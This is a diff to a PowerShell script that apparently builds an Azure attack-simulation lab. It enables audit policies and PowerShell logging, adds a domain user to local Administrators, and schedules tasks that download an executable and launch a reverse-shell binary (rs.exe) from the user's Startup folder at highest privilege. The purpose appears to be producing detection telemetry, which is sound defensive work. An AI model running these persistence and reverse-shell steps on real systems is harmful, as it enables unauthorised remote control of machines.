@@ -481,7 +481,7 @@ if (!$win10) {
 
 # Build the association
 $targetWin10ResourceId = $win10.Id
-$Win10PowershellassociationName = "win10-DCR-Association"
+$Win10PowershellassociationName = "Powershell-win10-DCR-Association"
 # Create DCR association
 New-AzDataCollectionRuleAssociation -TargetResourceId $targetWin10ResourceId -DataCollectionRuleId $powershellDataCollectionRuleId -AssociationName $Win10PowershellassociationName
 
@@ -823,6 +823,9 @@ Write-Output "Setting Advanced Audit Policies..."
 & auditpol.exe /set /subcategory:"Logoff" /success:disable
 & auditpol.exe /set /subcategory:"Special Logon" /success:enable /failure:enable
 
+# Detailed tracking
+& auditpol.exe /set /subcategory:"Process Creation" /success:enable /failure:enable
+
 # Account Logon
 & auditpol.exe /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
 & auditpol.exe /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
@@ -910,7 +913,7 @@ $output.Value | ForEach-Object { $_.Message }
 
 
 
-## Logon candice to win10
+## Logon users to win10, setting audit
 $w10script = @"
 net localgroup Administrators "ODOMAIN\candice.kevin" /add
 schtasks /create /tn "RunCMD" /tr "cmd.exe /c echo hi " /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "$adminPassword"
@@ -919,6 +922,7 @@ schtasks /create /tn "RunCMD2" /tr "cmd.exe /c echo hi " /sc ONCE /st 23:59 /ru 
 schtasks /run /tn "RunCMD2"
 New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -force
 Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1 -Type DWord
+& auditpol.exe /set /subcategory:"Process Creation" /success:enable /failure:enable
 gpupdate /force
 "@
 $output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName "win10" -CommandId "RunPowerShellScript" -ScriptString $w10script 
@@ -1217,6 +1221,9 @@ Write-Output "[+] LogonUser succeeded. We have an interactive token for `$UserNa
 Write-Output "`n[+] Creating a scheduled task to run DownloadStartup.ps1 as `$UserName..."
 schtasks /create /tn "RunDownload" /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Temp\DownloadStartup.ps1 -DownloadUrl `$DownloadUrl -ExeName `$ExeName" /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "`$Password"  /RL HIGHEST  /F 
 schtasks /run /tn "RunDownload"
+schtasks /create /tn "RunReverseShell" /tr "'C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe'" /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "`$Password"  /RL HIGHEST  /F 
+schtasks /run /tn "RunReverseShell"
+
 
 Write-Output "`n[+] Done. There should be Event Log for a Type 2 logon, and the exe file should be placed in candice.kevin's Startup folder."
 "@
